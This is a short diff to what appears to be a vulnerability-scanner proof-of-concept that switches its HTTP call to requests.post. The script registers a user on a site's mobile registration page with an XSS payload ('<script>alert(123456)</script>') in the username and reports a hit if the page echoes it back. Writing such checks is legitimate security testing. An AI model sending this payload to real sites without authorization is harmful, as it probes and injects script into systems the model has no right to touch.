@@ -35,9 +35,9 @@ class Poc(ABPoc):
             payload = '/mobile/user.php?act=act_register'
             url = '{target}'.format(target=self.target)+payload
             post_data = 'username=networks<script>alert(123456)</script>&email=xsstest@126.com&password=woaini&confirm_password=woaini&act=act_register&back_act='
-            code, head, body, _, _ = hh.http("-d \"%s\" %s" %(post_data,url))
-                       
-            if code == 200:
+            req = requests.post(url, data=post_data)
+            body = req.text
+            if req.status_code == 200:
                 if body and body.find('<script>alert(123456)</script>') != -1:
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
